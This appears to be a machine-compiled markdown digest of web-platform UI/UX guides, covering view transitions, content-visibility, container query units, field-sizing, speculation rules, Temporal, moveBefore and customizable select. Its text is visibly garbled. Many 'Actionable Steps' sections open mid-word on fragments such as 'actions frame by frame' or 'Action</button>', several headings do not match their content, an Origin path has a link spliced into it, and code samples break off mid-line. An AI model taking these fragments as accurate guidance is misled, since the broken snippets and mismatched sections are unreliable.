- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation Steps
> **Origin**: `ui-ux/NEXUS_DIRECTIONAL-NAVIGATION-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Single Page Applications (SPAs) provide the appearance of navigation by replacing the content of the page without navigating to a new page. By default, the content is simply replaced, without any transitions. Directional transitions can visually reinforce a spatial relationship between views. 

By sliding new content in from the direction the user is moving you create a mental map of the application structure. For instance, a product site may show a transition to the right for "forward," and to the left for "back", or a slideshow may transition up and down to show next and previous slides.



1. **Detect Navigation Direction**: Determine if the user is moving "forward" or "backward" in the application flow. How you detect the direction depends on your use case.
2. **Trigger Transition with Types**: Pass the direction in a `types` array to `document.startViewTransition()` to categorize the transition.
3. **Define Directional Animations with CSS**: Use the `:active-view-transition-type()` pseudo-class to apply specific animations based on the navigation type.



Define sliding animations to and from each direction. For bes...

#### 🔗 Traceability:
- [Source Context](NEXUS_DIRECTIONAL-NAVIGATION-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Efficient Background Processing
> **Origin**: `ui-ux/NEXUS_EFFICIENT-BACKGROUND-PROCESSING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Pause heavy background tasks when a component is not being rendered by the browser to conserve system resources and battery life.



The `content-visibility: auto` property allows the browser to skip rendering calculations for elements that are far outside the viewport. When the browser decides to skip or resume rendering for an element, it fires the `contentvisibilityautostatechange` event on that element.

By listening to this event, you can pause expensive operations like `<canvas>` animations, WebGL rendering, or high-frequency WebSocket data polling when they are not needed, and resume them just-in-time when the browser prepares to display the content.



It is important to understand when to use which API:

*   **Use `IntersectionObserver` for application logic** tied to the exact visual visibility of an element in the viewport (e.g., lazy-loading data, infinite scroll triggers).
*   **Use `contentvisibilityautostatechange` for rendering-heavy work** (like complex canvas updates or heavy DOM mutations). This event ties directly to the browser's internal rendering lifecycle. The browser often starts rendering an...

#### 🔗 Traceability:
- [Source Context](NEXUS_EFFICIENT-BACKGROUND-PROCESSING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Export HTML content from canvas
> **Origin**: `ui-ux/NEXUS_EXPORT-HTML-MEDIA-FROM-CANVAS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions frame by frame, for example, for streaming, capture DOM mutations using libraries like `rrweb`. 

Alternatively, implement a warning that HTML media export is not supported in the browser because it doesn't support HTML-in-Canvas.

#### 🔗 Traceability:
- [Source Context](NEXUS_EXPORT-HTML-MEDIA-FROM-CANVAS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Faster SPA View Transitions via State Caching
> **Origin**: `ui-ux/NEXUS_FASTER-SPA-VIEW-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Enable instant navigation between views in a Single-Page Application (SPA) by caching the rendered state of inactive views instead of destroying them.



Traditionally, when a user navigates between tabs or views in an SPA, developers either destroy the old view or hide it using `display: none`. Both approaches require the browser to recreate or recalculate the full layout and paint when the user returns to that view.

By using `content-visibility: hidden` on inactive views, the browser removes the element’s contents from the layout flow and stops painting it, but *retains* its cached rendering state in memory. When the user switches back, the view restores nearly instantly.



While this approach offers massive performance benefits, it introduces a specific trade-off that you must manage carefully:

*   **CPU Savings:** Massive. The browser completely skips layout and paint passes for hidden views.
*   **RAM Cost:** High. The browser keeps all DOM nodes, event listeners, and state for the hidden view in memory.



*   **DO** use this strategy for simple applications with a small, predictable number of views (e.g...

#### 🔗 Traceability:
- [Source Context](NEXUS_FASTER-SPA-VIEW-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_FLUID-SCALING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Fluid scaling allows components to adjust their internal proportions (like font sizes and spacing) based on their current dimensions. This creates a more cohesive design than jumping between fixed breakpoints.

While fluid scaling was historically achieved using viewport units (scaling based on the screen size), modern container query units allow components to scale relative to their parent container instead. This ensures components look good regardless of where they are placed in a layout, promoting better component isolation and reusability.





To use container query units, you must first define a containment context on a parent element.

```css
.component-wrapper {
  /* Define the container type. Use 'inline-size' for width-based scaling. */
  /* You can also use 'size' for both width and height, but it requires explicit sizing. */
  container-type: inline-size;
  
  /* Optional: Name the container for specific targeting */
  container-name: fluid-card;
}
```



Use container query units (`cqi`, `cqb`, etc.) to set sizes relative to the container's dimensions.

*   `cqi`: 1% of the container's inlin...

#### 🔗 Traceability:
- [Source Context](NEXUS_FLUID-SCALING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Auto-sizing form controls
> **Origin**: `ui-ux/NEXUS_FORM-FIELDS-AUTOMATICALLY-FIT-CONTENTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

By default, form controls like `<input>`, `<textarea>`, and `<select>` have fixed dimensions. Their sizes remain constant, regardless of the amount of content the user enters or selects.

To allow these controls to automatically shrink or grow to fit their content (including placeholders), use the `field-sizing: content` CSS property.



Setting `field-sizing: content` on inputs, selects, or textareas allows them to resize dynamically as the user types or selects options. However, you must account for inherited styling, layout defaults, and minimum/maximum constraints to ensure a robust user experience.

To prevent layout issues, it is recommended to set both `min-inline-size` (or `min-width`) and `max-inline-size` (or `max-width`) alongside `field-sizing: content` on text inputs. A minimum size prevents the input from collapsing to a width of zero when empty (making it unclickable), and a maximum size ensures it doesn't expand indefinitely and break the page layout.

For textareas, allowing horizontal auto-sizing can cause a jarring UX (e.g., a textarea with a long placeholder will abruptly shrink horizontally when the us...

#### 🔗 Traceability:
- [Source Context](NEXUS_FORM-FIELDS-AUTOMATICALLY-FIT-CONTENTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation steps
> **Origin**: `ui-ux/NEXUS_GROUP-ELEMENT-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

As items are added or removed from a list, or rearranged, transitions can help users maintain context. View transitions provide a way to transition between two states of an element by giving the element a unique `view-transition-name`. When multiple elements on a page share the same transition behavior, `view-transition-class` allows you to define that logic once in CSS rather than repeating it for every unique `view-transition-name`. This keeps your stylesheets maintainable while ensuring consistent animations across a group of elements.



1. **Assign unique names and a shared class**

Each element that needs to be tracked individually during a transition must have a unique `view-transition-name`.

```html
<!-- Mandatory: Each element must have a unique view-transition-name -->
<li style="view-transition-name: item-1" class="item">Item 1</li>
<li style="view-transition-name: item-2" class="item">Item 2</li>
```

To apply shared styles, also assign a `view-transition-class`.

```css
.item {
  view-transition-class: list-item;
}
```

2. **Define the shared transition logic**
   
Use the `::view-transition-gro...

#### 🔗 Traceability:
- [Source Context](NEXUS_GROUP-ELEMENT-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Identify heavy-running JavaScript
> **Origin**: `ui-ux/NEXUS_IDENTIFY-HEAVY-SCRIPTS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions.

The Long Animation Frames API is a lightweight API that can be used to identify heavy-running JavaScript in the field. A heavy-running script can be either a single long-running script, or a script that runs multiple times during the page lifecycle.

#### 🔗 Traceability:
- [Source Context](NEXUS_IDENTIFY-HEAVY-SCRIPTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Identify causes of poor INP
> **Origin**: `ui-ux/NEXUS_IDENTIFY-INP-CAUSES.MD` | **Distilled At**: 26/05/2026

#### 🧐 Core Insights (Distilled):
insights for JavaScript code delaying an interaction. A full performance trace using the JS Self-Profiling API is a heavyweight solution that is liable to cause performance problems. The Long Animation Frames API is a lightweight API that can be used to identify slow running JavaScript in the field for INP interactions.

#### 🛠 Actionable Steps:
actions leads to a poor impression of a page being slow or even completely broken. Interaction to Next Paint (INP) is a metric based on the Event Timing API. It measures the worst interaction (minus some outliers) as a measure of the page's responsiveness.

Identifying root causes of an unresponsive web page can be tricky especially as it depends on user interactions and environmental conditions such as device capabilities and network conditions. This makes it even more difficult to diagnose compared to a more repeatable and predictable scenario like page load. Lab data only replicates a small subset of real user scenarios so measuring the causes of slow INP in the field is essential.

The Event Timing API allows for splitting the INP duration into three subparts: Input Delay (processi

#### 🔗 Traceability:
- [Source Context](NEXUS_IDENTIFY-INP-CAUSES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Improve next page load performance
> **Origin**: `ui-ux/NEXUS_IMPROVE-NEXT-PAGE-LOAD-[PERFORMANCE.MD](../ui-ux/NEXUS_PERFORMANCE.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



One of the most effective ways to improve page load performance for users navigating a site is to initiate loading the next page they're about to visit *before* they visit it. This can be done through a technique called speculative loading using the Speculation Rules API.



Speculative loading works by using JSON-based speculation rules to tell the browser about links that can be prefetched or prerendered improving page load performance when user clicks on them.

The rules can either be a hardcoded list of URLs a `urls` key (known as a list rule), or with a `where` key containing a set of href and CSS selectors used to find links on the page (known as a `document` rule).

Rules can also include an optional `eagerness` property that specifies when the page should be prefetched or prerendered. The `eagerness` property can be set to `immediate`, `eager`, `moderate`, or `conservative`. `immediate` speculates as soon as possible, while the others wait for user signals such as hovering for a short period, for a longer period, or starting to click on the page respectively.

Rules can be combined with different eagerness setti...

#### 🔗 Traceability:
- [Source Context](NEXUS_IMPROVE-NEXT-PAGE-LOAD-[PERFORMANCE.MD](../ui-ux/NEXUS_PERFORMANCE.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Improve Text Layout and Legibility
> **Origin**: `ui-ux/NEXUS_IMPROVE-TEXT-LAYOUT-AND-LEGIBILITY.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action with Width:** `text-wrap: balance` does not change the container's width (`inline-size`). It only affects how text wraps *within* that width. This can leave empty space at the end of the container, which may affect layouts relying on full-width text blocks.

#### 🔗 Traceability:
- [Source Context](NEXUS_IMPROVE-TEXT-LAYOUT-AND-LEGIBILITY.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Key Implementation Details
> **Origin**: `ui-ux/NEXUS_INDIVIDUAL-TRANSFORM-PROPERTIES.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

The `transform` property allows you to apply multiple transformations in a specified order, but any changes to a single transformation require re-specifying the entire transformation chain. This makes it tricky to animate or transition a single transformation.

The individual CSS transform properties (`translate`, `rotate`, and `scale`) allow you to apply transformations independently of the `transform` property. This approach makes it simpler to override a single transformation, for instance on `:hover`.



Individual transform properties are always applied in a **fixed order**, regardless of their order in your CSS:
1. `translate`
2. `rotate`
3. `scale`
4. `transform` (applied last)

If you require a different order (e.g., scaling *before* rotating), you must continue using the `transform` property functions.

Transform functions do not override the individual transform properties. In other words, `scale: 2; transform: scale(3);` will first scale by 2x, then again by 3x, for a total of 6x.



The `transform` property and individual transform properties impact the layout and rendering of the page and may cause une...

#### 🔗 Traceability:
- [Source Context](NEXUS_INDIVIDUAL-TRANSFORM-PROPERTIES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Optimizing Interactions in Complex Layouts
> **Origin**: `ui-ux/NEXUS_INTERACTIONS-IN-COMPLEX-LAYOUTS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions in Complex Layouts
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Maintain high frame rates (60FPS) and eliminate interaction latency during drag-and-drop or heavy mutations in complex, multi-column layouts like Kanban boards or massive data grids.

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIONS-IN-COMPLEX-LAYOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Enable interactive HTML content in 3D scenes
> **Origin**: `ui-ux/NEXUS_INTERACTIVE-CONTENT-IN-3D-SCENES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
Action</button>
  </div>
</canvas>

<script>
  const canvas = document.getElementById("canvas");
  const gl = canvas.getContext("webgl");
  const uiElement = document.getElementById("ui-element");

  // Setup WebGL texture...
  const texture = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, texture);

  canvas.onpaint = () => {
    // 1. Update texture with HTML content
    if (gl.texElementImage2D) {
      gl.texElementImage2D(
        gl.TEXTURE_2D,
        0,
        gl.RGBA,
        gl.RGBA,
        gl.UNSIGNED_BYTE,
        uiElement,
      );
    }

    // ... Render your 3D scene here, calculating htmlElementMVP matrix ...

    // 2. Sync DOM position with 3D scene
    if (canvas.getElementTransform) {
      const mvpDOM = new DOMMatrix(Array.from(h

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIVE-CONTENT-IN-3D-SCENES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_INTERACTIVE-CONTENT-REVEAL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action */
.reveal-layer:hover {
  --inner-size: 100px;
  --outer-size: 120px;
}  
```

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIVE-CONTENT-REVEAL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Show a tooltip when hovering
> **Origin**: `ui-ux/NEXUS_INTEREST-TRIGGERED-TOOLTIPS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action an icon-only button will take, or provide additional form field guidance.

#### 🔗 Traceability:
- [Source Context](NEXUS_INTEREST-TRIGGERED-TOOLTIPS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Key Use Cases
> **Origin**: `ui-ux/NEXUS_LANGUAGE-DETECTION.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

The **Language Detector API** is a client-side web API designed to identify the language of a given text string. By performing detection locally in the browser, it enhances user privacy and reduces the need for heavy external libraries or costly server-side calls.



- **Translation Prep:** Identifying the source language before sending text to a translator.
- **Safety & Filtering:** Loading specific models for tasks like toxicity detection.
- **Accessibility:** Labeling content with the correct `lang` attribute for screen readers.
- **UI Localization:** Adjusting application interfaces based on the user's input language.



- **OS:** Windows 10/11, macOS 13+, Linux, or Chromebook Plus.
- **Storage:** 22 GB free space (model is removed if space drops below 10 GB).
- **RAM/CPU:** 16 GB RAM and 4+ CPU cores.
- **VRAM:** 4 GB+ if using a GPU.





Check model availability before attempting to instantiate the detector or trigger download.

**MANDATORY:** Instantiating the language detector or triggering a model download with `LanguageDetector.create()` **MUST** be initiated by a user gesture (such as a button click...

#### 🔗 Traceability:
- [Source Context](NEXUS_LANGUAGE-DETECTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_LIGHT-DISMISS-A-DIALOG.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Modern modal dialogs often support "light-dismiss," allowing users to close a dialog by clicking or tapping the backdrop (the area outside the dialog). The `closedby` attribute provides a declarative way to enable this behavior without custom JavaScript.



To enable light-dismiss:

1. Add `closedby="any"` to the `<dialog>` element.
2. Open the dialog using `dialog.showModal()`.



- `any`: Enables light-dismiss (clicking the backdrop), "close requests" (the `Esc` key), and developer mechanisms (e.g., `dialog.close()`).
- `closerequest`: Enables "close requests" and developer mechanisms only. This is the default for modal dialogs.
- `none`: Only developer mechanisms can close the dialog.


When a dialog is opened as a modal using `showModal()`, the browser generates a `::backdrop` pseudo-element. This backdrop covers the entire viewport and sits directly behind the dialog.

```css
/* Style the backdrop to indicate the dialog is modal */
dialog::backdrop {
  background-color: rgba(0, 0, 0, 0.5);
  backdrop-filter: blur(2px); /* Optional: add blur for modern browsers */
}
```



```html
<!-- MANDATORY: Use...

#### 🔗 Traceability:
- [Source Context](NEXUS_LIGHT-DISMISS-A-DIALOG.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Modeling Partial Time Concepts with Temporal
> **Origin**: `ui-ux/NEXUS_MODEL-PARTIAL-TIME-CONCEPTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Modeling date concepts that lack a full calendar date—such as credit card expirations, annual renewals, or daily alarms—has historically been error-prone with the legacy `Date` object. Developers often resort to using arbitrary days (like the 1st of the month) or parsing strings, leading to "day leakage" or incorrect calculations due to leap years and varying month lengths.

The `Temporal` API provides dedicated types for these partial concepts: `Temporal.PlainYearMonth`, `Temporal.PlainMonthDay`, and `Temporal.PlainTime`. These types ensure precision and avoid leaking irrelevant date components.




Use `Temporal.PlainYearMonth` to represent a year and a month.

```javascript
// Create a PlainYearMonth from values
// Use explicit calendar to avoid mismatch issues in polyfill environments
const expiry = Temporal.PlainYearMonth.from({ year: 2027, month: 12, calendar: 'iso8601' });

// Get the current year/month
const currentMonth = Temporal.Now.plainDateISO().toPlainYearMonth();

// Calculate duration until expiry
// largestUnit ensures the difference is expressed in years if applicable
const duration = currentM...

#### 🔗 Traceability:
- [Source Context](NEXUS_MODEL-PARTIAL-TIME-CONCEPTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Moving an element with state
> **Origin**: `ui-ux/NEXUS_MOVE-DOM-ELEMENT-WITHOUT-LOSING-STATE.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

When reparenting DOM elements using traditional methods like `appendChild()` or `insertBefore()`, the browser implicitly removes the element from the DOM and then inserts it into its new location. This "remove and insert" operation resets many internal states, causing `<iframe>` elements to reload, CSS animations to restart, and input fields to lose focus.

To move an element while preserving its state, use the `moveBefore()` API. This method performs an atomic move, completely bypassing the removal and insertion steps.



Use `moveBefore()` exactly as you would use `insertBefore()`. It requires two arguments: the node to move, and a reference node to insert before (or `null` to append to the end of the new parent).

```javascript
const newParent = document.getElementById('new-parent');
const elementWithState = document.getElementById('iframe-or-focused-input');

// MANDATORY: Use moveBefore to preserve state. 
// Passing null as the second argument appends the element to the end of newParent.
newParent.moveBefore(elementWithState, null);
```



If you are moving custom elements using `moveBefore()`, their `connec...

#### 🔗 Traceability:
- [Source Context](NEXUS_MOVE-DOM-ELEMENT-WITHOUT-LOSING-STATE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Omnibox Integration
> **Origin**: `ui-ux/NEXUS_OMNIBOX.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action=opensearch&search=${encodeURIComponent(text)}&limit=5&format=json`
    );
    const [, titles, , urls] = await response.json();

    const suggestions = titles.map((title, i) => ({
      content: urls[i],
      description: `${title} - <url>${urls[i]}</url>`
    }));

    suggest(suggestions);
  } catch (err) {
    console.error('Search failed:', err);
  }
});
```

#### 🔗 Traceability:
- [Source Context](NEXUS_OMNIBOX.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overflow Clipping Control
> **Origin**: `ui-ux/NEXUS_OVERFLOW-CLIPPING-CONTROL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action logic.
- **DO** configure `overflow-clip-margin` with a specified length offset when applying external visual effects (like `filter: drop-shadow()`) to prevent sharp bounding box truncation without altering or expanding layout geometry.
- **DO NOT** apply `overflow: clip` if the container requires programmatic scroll manipulation via JavaScript or serves as the immediate layout context for `position: sticky` elements, as `clip` completely disables scrolling.

#### 🔗 Traceability:
- [Source Context](NEXUS_OVERFLOW-CLIPPING-CONTROL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Critical Rendering Path (CRP) Optimization
> **Origin**: `ui-ux/NEXUS_PERFORMANCE.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action to Next Paint (INP) & Main Thread Unblocking

INP measures the latency of all interactive events across the page's lifecycle. Poor INP is caused by long-running JavaScript tasks blocking the main thread.

#### 🔗 Traceability:
- [Source Context](NEXUS_PERFORMANCE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation Steps
> **Origin**: `ui-ux/NEXUS_PHYSICS-BASED-EASING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Traditional CSS easing functions like `ease-in` or `cubic-bezier()` are limited to simple curves, making it impossible to create complex physics-based effects like bounces or springs. The `linear()` timing function solves this by allowing you to provide a series of stops that can approximate complex curves. Transitions and animations are interpolated based on straight lines between the stops, but within enough stops, it can appear smooth.



1.  **Generate the curve stops:**
    Manually plotting dozens of points for a spring or bounce is impractical. Use a timing function from an external library, or use a  tool to convert an existing JavaScript easing function or an SVG path into the `linear()` syntax. Optional: store these timing functions as CSS custom properties for reuse throughout your site.
2.  **Define the timing function:**
    Apply the generated stops to the `transition-timing-function` or `animation-timing-function` property, or through the `transition` or `animation` shorthands.
3.  **Adjust the duration:**
    Unlike JavaScript physics engines where duration is derived from physical properties (mass, stiffnes...

#### 🔗 Traceability:
- [Source Context](NEXUS_PHYSICS-BASED-EASING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Fallback strategies
> **Origin**: `ui-ux/NEXUS_PLATFORM-CONTROLS-DISMISS-DIALOG.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

When a modal dialog is open, users expect to use familiar controls to dismiss them: pressing the <kbd>Esc</kbd> key on a keyboard, using the back button or gesture on mobile platforms, or a dismiss gesture with assistive technologies.

When the `<dialog>` element was first introduced, it could be dismissed with the <kbd>Esc</kbd> key, but not other platform controls such as a back button/gesture on mobile. With the addition of the `closedby` attribute for `<dialog>` elements, the extended behavior of responding to more platform-specific controls for close requests has been applied for `<dialog>` elements that are opened in a modal state (i.e. when opened imperatively with the `<dialog>` element’s `showModal()` method in JavaScript or declaratively with the `show-modal` invoker command). So, there is no specific change developers need to make if they are already using the `<dialog>` element.

```html
<!-- MANDATORY: must be opened with either `showModal()` with JavaScript or the `show-modal` command using declarative command invokers in order respond to close requests including platform-specific controls. -->
<dialog aria-label...

#### 🔗 Traceability:
- [Source Context](NEXUS_PLATFORM-CONTROLS-DISMISS-DIALOG.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Precise Text Alignment
> **Origin**: `ui-ux/NEXUS_PRECISE-TEXT-ALIGNMENT.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026





Browsers automatically add extra whitespace above and below text characters to accommodate line-height and font-specific metrics like ascenders and descenders. This "ghost space" makes it impossible to achieve pixel-perfect vertical alignment using standard CSS.

Common issues include:
- **Misaligned Icons**: Text appears visually lower or higher than an adjacent icon even when using `align-items: center`.
- **Inaccurate Padding**: A button with `padding: 12px` visually appears to have more space on top or bottom because of the font's internal leading.
- **Flush Alignment**: You cannot align the top of a capital letter exactly with the top of a container or an adjacent image without using "magic number" negative margins.



The `text-box-trim` and `text-box-edge` properties (shorthand `text-box`) allow you to trim this internal leading based on specific font metrics. By trimming the text box to the **cap-height** (top of capital letters) and the **alphabetic baseline** (bottom of most letters), you can ensure that the element's bounding box matches its visual content.



1. **MANDATORY**: Apply `text-box-trim: tr...

#### 🔗 Traceability:
- [Source Context](NEXUS_PRECISE-TEXT-ALIGNMENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Prevent text wrapping
> **Origin**: `ui-ux/NEXUS_PREVENT-TEXT-WRAPPING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Modern CSS provides the `text-wrap` property to control how text breaks within its container. To ensure text stays on a single line and ignores container boundaries, use `text-wrap: nowrap`. This is the modern, more semantic replacement for `white-space: nowrap`.

Preventing text wrapping is useful for UI elements like navigation tabs, horizontal scrolling chips, or any scenario where a line break would break the layout or visual design.





To prevent any automatic line breaks, apply `text-wrap: nowrap` to the element containing the text.

1. **MANDATORY**: Apply `text-wrap: nowrap` to the target element.
2. **OPTIONAL**: Use an `overflow` property (such as `hidden`, `scroll`, or `auto`) to manage the resulting overflow.
3. **OPTIONAL**: Use `text-overflow: ellipsis` to provide a visual cue when text is truncated. Note: This requires `overflow: hidden`.



```css
.no-wrap-text {
  /* MANDATORY: Prevents automatic line breaks */
  text-wrap: nowrap;

  /* OPTIONAL: Handles the overflow visually */
  overflow: hidden;
  text-overflow: ellipsis;

  /* OPTIONAL: Constrain width to force and handle overflow ...

#### 🔗 Traceability:
- [Source Context](NEXUS_PREVENT-TEXT-WRAPPING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Pull to Reveal
> **Origin**: `ui-ux/NEXUS_PULL-TO-REVEAL.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



"Pull to reveal" is a UI pattern where content (such as a search bar or refresh control) is hidden above the top of a scrollable area on initial load, and the user can pull down (scroll up) to reveal it. This pattern is commonly used in mobile apps and web apps for search bars, filters, and other secondary controls that should be accessible but not immediately visible.

The CSS property `scroll-initial-target` offers a declarative, CSS-only way to implement this pattern. By setting `scroll-initial-target: nearest` on the main content element, the scroll container will render with the hidden content scrolled out of view. Previously, developers relied on JavaScript (`Element.scrollIntoView()`) or URL fragment identifiers (`#content-id`) to achieve this, both of which have limitations and are tricky to implement.



To implement a pull-to-reveal pattern:

1. **Ensure a scroll container:** The target element must be inside a scroll container (an element with overflow that allows scrolling, such as `overflow: auto`). This can be any ancestor element, including the root `<html>` element.
2. **Define the hidden element:** Place...

#### 🔗 Traceability:
- [Source Context](NEXUS_PULL-TO-REVEAL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Reduce Style Repetition with CSS Functions
> **Origin**: `ui-ux/NEXUS_REDUCE-STYLE-REPETITION.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Maintaining large stylesheets often leads to repetitive logic, especially when dealing with design system tokens like gradients or responsive layout patterns.

The CSS `@function` at-rule allows you to encapsulate this logic into reusable, parameterized functions, making your CSS more maintainable, consistent and DRY (Don't Repeat Yourself).



A custom function is defined using the `@function` rule followed by a dashed name and a list of parameters. The function returns a value using the `result` property. 

```css
@function --my-function(--input1 <length>, --input2: default-value) returns <length> {
  /* Logic goes here */
  result: var(--input1);
}
```


- **Parameters:** Must start with a double dash (`--`).
- **Defaults:** You can provide default values using a colon (`:`).
- **Result:** The `result` property determines the value the function returns. The last `result` declared in the function body wins.
- **Scoping:** Parameters and variables defined inside the function are locally scoped.
- **Types:** You can require parameters and the returned value to match a CSS type with bracket notation (e.g., `<co...

#### 🔗 Traceability:
- [Source Context](NEXUS_REDUCE-STYLE-REPETITION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Required Field Feedback
> **Origin**: `ui-ux/NEXUS_REQUIRED-FIELD-FEEDBACK.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action state using a `WeakMap`. This avoids polluting the DOM with "dirty" classes or data attributes.

```javascript
const UserInvalidFallback = (() => {
  const dirtyState = new WeakMap();

  const updateState = (input) => {
    const isValid = input.checkValidity();

    // Update both visual and ARIA state
    input.classList.toggle('user-invalid-fallback', !isValid);
    input.classList.toggle('user-valid-fallback', isValid);

    if (!isValid) {
      input.setAttribute('aria-invalid', 'true');
    } else {
      input.removeAttribute('aria-invalid');
    }
  };

  const handleEvent = (event) => {
    const input = event.target;

    if (event.type === 'reset') {
      const controls = input.elements || [];
      for (const control of controls) {
        dir

#### 🔗 Traceability:
- [Source Context](NEXUS_REQUIRED-FIELD-FEEDBACK.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Rich Media Picker (Customizable Select)
> **Origin**: `ui-ux/NEXUS_RICH-MEDIA-PICKER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The native `<select>` element was historically difficult to style and could only contain plain text options. The `appearance: base-select` property offers a declarative, CSS-only way to opt into a customizable state for the `<select>` element. This allows developers to include rich HTML content—such as images, SVGs, and complex layouts—inside `<option>` elements, while retaining native keyboard accessibility and form integration. Use this pattern to replace heavy, custom-built select components with standard, native elements.



To implement a rich media picker using the Customizable Select API:

1. **Opt-in to base styles**: Apply `appearance: base-select` to both the `<select>` element and its internal picker using the `::picker(select)` pseudo-element. This changes the browser's HTML parser for the contents inside the `<select>`.
2. **Define the Button Content**: Use standard `<button>` and `<selectedcontent>` elements inside the `<select>` to define what is shown when the picker is closed. The `<selectedcontent>` element automatically mirrors the content of the selected option. This is required if you want to display t...

#### 🔗 Traceability:
- [Source Context](NEXUS_RICH-MEDIA-PICKER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Sandbox UI/UX Distilled Findings
